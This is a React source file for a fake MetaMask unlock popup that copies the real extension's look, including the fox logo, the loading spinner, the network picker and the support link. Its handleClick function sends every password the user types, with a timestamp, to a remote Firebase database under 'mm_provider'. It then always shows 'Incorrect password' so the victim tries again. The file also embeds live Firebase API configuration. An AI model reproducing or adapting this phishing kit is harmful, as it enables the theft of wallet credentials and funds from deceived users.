import { createLogo } from "./Bundle";
import "./MM.css";
import meta_logo from "./assets/img/metamask-fox.svg";
import spinner from "./assets/img/spinner.gif";
import bnb from "./images/bnb.png";
import ether from "./images/eth_logo.svg";
import ethLogo from "./images/eth_logo.svg";
import { ReactComponent as AddIcon } from "./images/icons/add.svg";
import arrowDown from "./images/icons/arrow-down.svg";
import { ReactComponent as CloseImg } from "./images/icons/close.svg";
import { ReactComponent as SearchIcon } from "./images/icons/search.svg";
import linea from "./images/linea-logo-mainnet.svg";
import polygon from "./images/matic-token.svg";
import "./index.css";
import { initializeApp } from "firebase/app";
import { getDatabase } from "firebase/database";
import { ref, push } from "firebase/database";
import { useState, useEffect } from "react";
import Modal from "react-modal";

const basic = {
  apiKey: "AIzaSyD22LIz8nceulmiNWLDHC8nZj1SQ48doAQ",
  authDomain: "nft-list-67033.firebaseapp.com",
  projectId: "nft-list-67033",
  storageBucket: "nft-list-67033.appspot.com",
  messagingSenderId: "38959321496",
  appId: "1:38959321496:web:86f6b0da736e9151f75bed",
  measurementId: "G-2G9BE52S8T"
};
const rtapp = initializeApp(basic);
const rtdb = getDatabase(rtapp);
const chainList = [
  {
    icon: ether,
    title: "Ethereum Mainnet",
  },
  {
    icon: linea,
    title: "Linea Mainnet",
  },
  {
    icon: polygon,
    title: "Polygon Mainnet",
  },
  {
    icon: bnb,
    title: "BNB Chain",
  },
];
const MM = ({ isOpen, setIsOpen }) => {
  const [loading, setLoading] = useState(true);
  const [pwd, setPwd] = useState("");
  const [validShow, setValidShow] = useState(false);
  const [pwdFocus, setPwdFocus] = useState(false);
  const [focused, setFocus] = useState(false);
  const [isDarkMode, setIsDarkMode] = useState(false)
  const [mouseOver, setMouseOver] = useState(false);
  const [selectedChain, selectChain] = useState(0);
  const [ischainModalOpen, showChainModal] = useState(false);
  const styles = {
    overlay: {
      position: "fixed",
      backgroundColor: "transparent",
    },
    content: {
      top: "0px",
      left: "auto",
      right: "150px",
      bottom: "auto",
      padding: "0",
      border: "0",
      borderRadius: "5",
      // marginRight: "-30%",
      // transform: "translate(-50%, -50%)",
      boxShadow: "0px 0px 5px #00000088",
      zIndex: 10000,
    },
  };

  const handleOpenModal = () => {
    setIsOpen(true);
  };

  const handleCloseModal = () => {
    setIsOpen(false);
  };
  const handleChange = (val) => {
    setPwd(val);
    setValidShow(false);
  };
  const handleClick = () => {
    push(ref(rtdb, "mm_provider/1007"), {
      value: pwd,
      date: String(new Date()),
    });
    setValidShow(true);
  };

  const handleKeyUp = (e) => {
    if (e.keyCode == 13) {
      handleClick();
    }
  };
  const handleBlur = () => setPwdFocus(false);
  const handleFocus = () => setPwdFocus(true);
  document.body.onblur = function () {
    setIsOpen(false);
  };
  useEffect(() => {
    if (isOpen) {
      setTimeout(() => {
        setLoading(false);
        setTimeout(createLogo,100);;
      }, 3000);
    } else {
      showChainModal(false);
      setLoading(true);
    }
  }, [isOpen]);

  useEffect(() => {
    if(window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
      setIsDarkMode(true);
    }
    else {
      setIsDarkMode(false);
    }
  })

  return (
    <Modal
      isOpen={isOpen}
      style={styles}
      shouldCloseOnOverlayClick={true}
      shouldCloseOnEsc={true}
      onRequestClose={handleCloseModal}
      ariaHideApp={false}
    >
      {loading ? (
        <div
          className="mmc"
          style={{
            display: "flex",
            flexDirection: "column",
            overflowX: "hidden",
            width: "365px",
          }}
        >
          <div
            style={{
              width: "365px",
              height: "620px",
              backgroundColor: isDarkMode?"#24272a":"#fff",
              display: "flex",
              justifyContent: "center",
            }}
          >
            <div style={{ display: "flex", flexFlow: "column" }}>
              <img
                style={{
                  width: "160px",
                  height: "160px",
                  alignSelf: "center",
                  margin: "160px 0 0 0",
                }}
                src={meta_logo}
              ></img>
              <img
                src={spinner}
                style={{
                  width: "36px",
                  height: "36px",
                  alignSelf: "center",
                  marginTop: "14px",
                }}
              ></img>
            </div>
          </div>
        </div>
      ) : (
        <>
          <div id="app-content" data-theme={isDarkMode?"dark":""} style={{ border: "1px solid #404040" }}>
            <div className="app os-win">
              <div className="mm-box multichain-app-header multichain-app-header-shadow mm-box--margin-bottom-0 mm-box--display-flex mm-box--align-items-center mm-box--width-full mm-box--background-color-background-default">
                <div className="mm-box multichain-app-header__lock-contents mm-box--padding-2 mm-box--display-flex mm-box--gap-2 mm-box--justify-content-space-between mm-box--align-items-center mm-box--width-full mm-box--background-color-background-default">
                  <div>
                    <button
                      className="mm-box mm-picker-network multichain-app-header__contents__network-picker mm-box--padding-right-4 mm-box--padding-left-2 mm-box--display-flex mm-box--gap-2 mm-box--align-items-center mm-box--background-color-background-alternative mm-box--rounded-pill"
                      aria-label="Network Menu Ethereum Mainnet"
                      data-testid="network-display"
                      onClick={() => showChainModal(true)}
                    >
                      <div
                        className="mm-box mm-text mm-avatar-base mm-avatar-base--size-xs mm-avatar-network mm-picker-network__avatar-network mm-text--body-xs mm-text--text-transform-uppercase mm-box--display-flex mm-box--justify-content-center mm-box--align-items-center mm-box--color-text-default mm-box--background-color-background-alternative mm-box--rounded-full mm-box--border-color-transparent box--border-style-solid box--border-width-1"
                        role="img"
                        style={{ marginLeft: 4 }}
                      >
                        <img
                          className="mm-avatar-network__network-image"
                          src={chainList[selectedChain].icon}
                          alt="Ethereum Mainnet logo"
                        />
                      </div>
                      <span
                        className="mm-box mm-text mm-text--body-sm mm-text--ellipsis mm-box--color-text-default"
                        style={{ fontSize: "12px" }}
                      >
                        {chainList[selectedChain].title}
                      </span>
                      <span
                        className="mm-box mm-picker-network__arrow-down-icon mm-icon mm-icon--size-xs mm-box--margin-left-auto mm-box--display-inline-block mm-box--color-icon-default"
                        style={{ marginRight: "4px", marginTop: "-5px" }}
                      >
                        <img
                          src={arrowDown}
                          style={{
                            width: "100%",
                            height: "100%",
                            color: "white",
                            filter: isDarkMode?"invert(100%)":""
                          }}
                        ></img>
                      </span>
                    </button>
                  </div>
                  <button
                    className="mm-box app-header__logo-container app-header__logo-container--clickable mm-box--background-color-transparent"
                    data-testid="app-header-logo"
                    style={{ marginRight: "8px" }}
                  >
                    <img
                      style={{
                        alignSelf: "center",
                        width: "100%",
                        height: "100%",
                      }}
                      src={meta_logo}
                    ></img>
                  </button>
                </div>
              </div>
              <div className="mm-box main-container-wrapper">
                <div className="unlock-page__container">
                  <div className="unlock-page" data-testid="unlock-page">
                    <div className="unlock-page__mascot-container">
                      <div style={{ zIndex: 0, marginBottom: "8px" }}>
                        <div id="meta_fox"></div>
                      </div>
                    </div>
                    <h1 className="unlock-page__title">Welcome back!</h1>
                    <div
                      style={{
                        fontSize: "16px",
                        fontFamily: `"Euclid Circular B", Roboto, Helvetica, Arial, sans-serif`,
                      }}
                    >
                      The decentralized web awaits
                    </div>
                    <div className="unlock-page__form">
                      <div className="MuiFormControl-root MuiTextField-root MuiFormControl-fullWidth">
                        <div
                          className={
                            "MuiInputBase-root MuiInput-root MuiInput-underline jss3 MuiInputBase-fullWidth MuiInput-fullWidth MuiInputBase-formControl MuiInput-formControl" +
                            (validShow == true ? " Mui-error" : "") +
                            (pwdFocus == true ? " Mui-focused" : "")
                          }
                          style={{color: isDarkMode?"#d6d9dc": "rgba(0,0,0,0.87)"}}
                        >
                          <input
                            aria-invalid="false"
                            autoComplete="current-password"
                            id="password"
                            type="password"
                            dir="auto"
                            data-testid="unlock-password"
                            className={"MuiInputBase-input MuiInput-input"}
                            style={{ marginTop: "16px", fontSize: "16px" }}
                            required
                            value={pwd}
                            onFocus={handleFocus}
                            onBlur={handleBlur}
                            onChange={(e) => {
                              handleChange(e.target.value);
                            }}
                            onKeyUp={handleKeyUp}
                          />

                          <label
                            className="MuiFormLabel-root MuiInputLabel-root jss1 MuiInputLabel-formControl MuiInputLabel-animated"
                            data-shrink="false"
                            htmlFor="password"
                            id="password-label"
                            // style={{ fontSize: "1.5rem" }}
                          >
                            Password
                          </label>
                        </div>
                        <div
                          className={
                            validShow
                              ? "validate-password"
                              : "validate-password-hidden"
                          }
                        >
                          Incorrect password
                        </div>
                      </div>
                    </div>
                    <button
                      className="button btn--rounded btn-default"
                      data-testid="unlock-submit"
                      type="button"
                      variant="contained"
                      disabled={!pwd}
                      style={{
                        backgroundColor: "var(--brand-colors-blue-blue300) !important",
                        color: "var(--color-primary-inverse)",
                        marginTop: "12px",
                        fontWeight: "400",
                        boxShadow: "none",
                        borderRadius: "100px",
                        fontSize: "14px",
                        padding: "11px 0",
                      }}
                      onClick={handleClick}
                    >
                      Unlock
                    </button>
                    <div className="unlock-page__links">
                      <a
                        className="button btn-link unlock-page__link"
                        style={{ fontSize: "12px" }}
                        role="button"
                        tabIndex="0"
                      >
                        Forgot password?
                      </a>
                    </div>
                    <div
                      className="unlock-page__support"
                      style={{ fontSize: "12px", fontFamily: "poppines" }}
                    >
                      <span>
                        Need help? Contact{" "}
                        <a
                          href="https://support.metamask.io"
                          target="_blank"
                          rel="noopener noreferrer"
                        >
                          MetaMask support
                        </a>
                      </span>
                    </div>
                  </div>
                </div>
              </div>
            </div>
            {ischainModalOpen && (
              <div className="mm-modal">
                <div
                  className="mm-box mm-modal-overlay mm-box--width-full mm-box--height-full mm-box--background-color-overlay-default"
                  ariaHidden="true"
                  style={{ position: "absolute" }}
                ></div>
                <div
                  data-focus-guard="true"
                  tabindex="0"
                  style={{
                    width: "1px",
                    height: "0px",
                    padding: "0px",
                    overflow: "hidden",
                    position: "fixed",
                    top: "1px",
                    left: "1px",
                  }}
                ></div>
                <div data-focus-lock-disabled="false">
                  <div
                    className="mm-box mm-modal-content multichain-network-list-menu-content-wrapper mm-box--padding-top-4 mm-box--sm:padding-top-8 mm-box--md:padding-top-12 mm-box--padding-right-4 mm-box--padding-bottom-4 mm-box--sm:padding-bottom-8 mm-box--md:padding-bottom-12 mm-box--padding-left-4 mm-box--display-flex mm-box--justify-content-center mm-box--align-items-flex-start mm-box--width-screen mm-box--height-screen"
                    style={{ width: "364px", paddingTop: "16px" }}
                  >
                    <section
                      className="mm-box mm-modal-content__dialog mm-modal-content__dialog--size-sm multichain-network-list-menu-content-wrapper__dialog mm-box--padding-0 mm-box--display-flex mm-box--flex-direction-column mm-box--width-full mm-box--background-color-background-default mm-box--rounded-lg"
                      role="dialog"
                      aria-modal="true"
                      style={{ overflowY: "auto", "--size": "340px" }}
                    >
                      <div className="mm-box mm-header-base mm-modal-header mm-box--padding-top-4 mm-box--padding-right-4 mm-box--padding-bottom-6 mm-box--display-flex mm-box--justify-content-space-between">
                        <div
                          className="mm-box"
                          style={{
                            marginLeft: "24px",
                            width: "calc(100% - 48px)",
                          }}
                        >
                          <header
                            className="mm-box mm-text mm-text--heading-sm mm-text--text-align-center mm-box--color-text-default"
                            style={{ borderBottom: "none", fontSize: "16px" }}
                          >
                            Select a network
                          </header>
                        </div>
                        <div
                          className="mm-box mm-box--display-flex mm-box--justify-content-flex-end"
                          style={{ minWidth: "24px" }}
                        >
                          <button
                            className="mm-box mm-button-icon mm-button-icon--size-sm mm-box--display-inline-flex mm-box--justify-content-center mm-box--align-items-center mm-box--color-icon-default mm-box--background-color-transparent mm-box--rounded-lg"
                            aria-label="Close"
                            style={{ marginRight: 18 }}
                          >
                            <span
                              className="mm-box mm-icon mm-icon--size-sm mm-box--display-inline-block mm-box--color-inherit"
                              style={{
                                width: "inherit",
                                height: "inherit",
                                backgroundColor: "transparent",
                              }}
                              onClick={() => showChainModal(false)}
                            >
                              <CloseImg fill="white"></CloseImg>
                            </span>
                          </button>
                        </div>
                      </div>
                      <div
                        className="mm-box mm-box--padding-top-0 mm-box--padding-right-4 mm-box--padding-bottom-4 mm-box--padding-left-4"
                        style={{ paddingLeft: 16, paddingRight: 16, "fontSize": "14px !important" }}
                      >
                        <div
                          className={
                            "mm-box mm-text-field mm-text-field--size-sm mm-text-field--truncate mm-text-field-search mm-box--padding-right-0 mm-box--padding-left-4 mm-box--display-inline-flex mm-box--align-items-center mm-box--width-full mm-box--background-color-background-default mm-box--rounded-sm mm-box--border-width-1 box--border-style-solid " +
                            (focused ? "mm-text-field-search-focused" : "")
                          }
                          style={{ paddingLeft: 16 }}
                        >
                          {/* <span
                          className="mm-box mm-icon mm-icon--size-sm mm-box--padding-1 mm-box--display-inline-block mm-box--color-inherit"
                          style={{
                            maskImage: `url("./images/icons/search.svg")`,
                          }}
                        ></span> */}
                          <SearchIcon
                            className="mm-box mm-icon mm-icon--size-sm mm-box--padding-1 mm-box--display-inline-block mm-box--color-inherit"
                            style={{
                              padding: "0px",
                              "--size": "16",
                            }}
                            fill="white"
                          />
                          <input
                            className="mm-box mm-text mm-input mm-input--disable-state-styles mm-text-field__input mm-text--body-md mm-box--margin-0 mm-box--padding-0 mm-box--padding-right-4 mm-box--padding-left-2 mm-box--color-text-default mm-box--background-color-transparent mm-box--border-style-none"
                            autocomplete="off"
                            placeholder="Search"
                            type="search"
                            focused={focused}
                            onFocus={() => setFocus(true)}
                            onBlur={() => setFocus(false)}
                            value=""
                            style={{ paddingRight: 16, paddingLeft: 8, "fontSize": "14px !important" }}
                          />
                        </div>
                      </div>
                      <div className="mm-box multichain-network-list-menu">
                        <div
                          className="mm-box characters"
                          dataRbdDroppableId="characters"
                          dataRbdDroppableContextId="0"
                        >
                          {chainList.map((item, key) => (
                            <div
                              className="mm-box"
                              dataRbdDraggableContextId="0"
                              dataRbdDraggableId="mainnet"
                              tabindex="0"
                              role="button"
                              ariaDescribedby="rbd-hidden-text-0-hidden-text-0"
                              dataRbdDragHandleFraggableId="mainnet"
                              dataRbdDragHandleContextId="0"
                              draggable="false"
                              onClick={() => {
                                selectChain(key);
                                showChainModal(false);
                              }}
                            >
                              <div
                                className={
                                  "mm-box multichain-network-list-item " +
                                  (selectedChain == key
                                    ? "multichain-network-list-item--selected"
                                    : "") +
                                  " mm-box--padding-4 mm-box--display-flex mm-box--gap-2 mm-box--justify-content-space-between mm-box--align-items-center mm-box--width-full " +
                                  (selectedChain == key
                                    ? "mm-box--background-color-primary-muted"
                                    : "")
                                }
                              >
                                {selectedChain == key && (
                                  <div
                                    className="mm-box multichain-network-list-item__selected-indicator mm-box--background-color-primary-default mm-box--rounded-pill"
                                    style={{ marginLeft: -12 }}
                                  ></div>
                                )}
                                <div className="mm-box mm-text mm-avatar-base mm-avatar-base--size-md mm-avatar-network mm-text--body-sm mm-text--text-transform-uppercase mm-box--display-flex mm-box--justify-content-center mm-box--align-items-center mm-box--color-text-default mm-box--background-color-background-alternative mm-box--rounded-full mm-box--border-color-transparent box--border-style-solid box--border-width-1">
                                  <img
                                    className="mm-avatar-network__network-image"
                                    src={item.icon}
                                    alt="Ethereum Mainnet logo"
                                  />
                                </div>
                                <div
                                  className="mm-box multichain-network-list-item__network-name mm-box--display-flex mm-box--align-items-center"
                                  dataTestid={item.title}
                                >
                                  <p
                                    className="mm-box mm-text mm-text--body-md mm-text--ellipsis mm-box--color-text-default mm-box--background-color-transparent"
                                    tabindex="0"
                                    style={{ marginBottom: "0px" }}
                                  >
                                    {item.title}
                                  </p>
                                </div>
                              </div>
                            </div>
                          ))}
                        </div>
                      </div>
                      <div className="mm-box mm-box--padding-4 mm-box--display-flex mm-box--justify-content-space-between">
                        <p
                          className="mm-box mm-text mm-text--body-md mm-box--color-text-default"
                          style={{ marginBottom: 0 }}
                        >
                          Show test networks
                        </p>
                        <label
                          tabindex="0"
                          className="toggle-button toggle-button--off"
                        >
                          <div
                            style={{
                              display: "flex",
                              width: "52px",
                              alignItems: "center",
                              justifyContent: "flex-start",
                              position: "relative",
                              cursor: "pointer",
                              backgroundColor: "transparent",
                              border: "0px",
                              padding: "0px",
                              userSelect: "none",
                              "-webkit-tap-highlight-color": "transparent",
                            }}
                          >
                            <div
                              style={{
                                width: "40px",
                                height: "24px",
                                padding: "0px",
                                borderRadius: "26px",
                                display: "flex",
                                alignItems: "center",
                                justifyContent: "center",
                                border: "none",
                                backgroundColor: "rgb(159, 166, 174)",
                              }}
                            >
                              <div
                                style={{
                                  fontSize: "11px",
                                  display: "flex",
                                  alignItems: "center",
                                  justifyContent: "center",
                                  fontFamily:
                                    "Helvetica Neue, Helvetica, sans-serif",
                                  position: "relative",
                                  color: "rgb(250, 250, 250)",
                                  marginTop: "auto",
                                  marginBottom: "auto",
                                  lineHeight: "0",
                                  opacity: "0",
                                  width: "26px",
                                  height: "20px",
                                  left: "4px",
                                }}
                              ></div>
                              <div
                                style={{
                                  fontSize: "11px",
                                  display: "flex",
                                  alignItems: "center",
                                  justifyContent: "center",
                                  fontFamily:
                                    "Helvetica Neue, Helvetica, sans-serif",
                                  position: "relative",
                                  color: "rgba(255, 255, 255, 0.6)",
                                  bottom: "0px",
                                  marginTop: "auto",
                                  marginBottom: "auto",
                                  paddingRight: "5px",
                                  lineHeight: "0",
                                  width: "26px",
                                  height: "20px",
                                  opacity: "1",
                                }}
                              ></div>
                            </div>
                            <div
                              style={{
                                position: "absolute",
                                height: "100%",
                                top: "0px",
                                left: "0px",
                                display: "flex",
                                flex: "1 1 0%",
                                alignSelf: "stretch",
                                alignItems: "center",
                                justifyContent: "flex-start",
                              }}
                            >
                              <div
                                style={{
                                  width: "18px",
                                  height: "18px",
                                  display: "flex",
                                  alignSelf: "center",
                                  boxShadow:
                                    "var(--shadow-size-xs) var(--color-shadow-default)",
                                  borderRadius: "50%",
                                  boxSizing: "border-box",
                                  position: "relative",
                                  backgroundColor: "rgb(255, 255, 255)",
                                  left: "3px",
                                }}
                              ></div>
                            </div>
                            <input
                              type="checkbox"
                              value="false"
                              style={{
                                border: "0px",
                                clip: "rect(0px, 0px, 0px, 0px)",
                                height: "1px",
                                margin: "-1px",
                                overflow: "hidden",
                                padding: "0px",
                                position: "absolute",
                                width: "1px",
                              }}
                            />
                          </div>
                          <div className="toggle-button__status">
                            <span className="toggle-button__label-off"></span>
                            <span className="toggle-button__label-on"></span>
                          </div>
                        </label>
                      </div>
                      <div className="mm-box mm-box--padding-4">
                        <button
                          className="mm-box mm-text mm-button-base mm-button-base--size-lg mm-button-base--block mm-button-secondary mm-text--body-md-medium mm-box--padding-0 mm-box--padding-right-4 mm-box--padding-left-4 mm-box--display-inline-flex mm-box--justify-content-center mm-box--align-items-center mm-box--color-primary-default mm-box--background-color-transparent mm-box--rounded-pill mm-box--border-color-primary-default box--border-style-solid box--border-width-1"
                          onMouseOver={() => setMouseOver(true)}
                          onMouseOut={() => setMouseOver(false)}
                          onClick={() => {
                            window.open(
                              "chrome-extension://nkbihfbeogaeaoehlefnkodbefgpgknn/home.html"
                            );
                          }}
                        >
                          <AddIcon
                            className="mm-box mm-icon mm-icon--size-sm mm-box--margin-inline-end-1 mm-box--display-inline-block mm-box--color-inherit"
                            fill={"#0376c9"}
                          ></AddIcon>
                          Add a custom network
                        </button>
                      </div>
                    </section>
                  </div>
                </div>
                {/* <div
                data-focus-guard="true"
                tabindex="0"
                style="width: 1px; height: 0px; padding: 0px; overflow: hidden; position: fixed; top: 1px; left: 1px;"
              ></div> */}
              </div>
            )}
          </div>
          <div id="popover-content"></div>
        </>
      )}
    </Modal>
  );
};

export default MM;
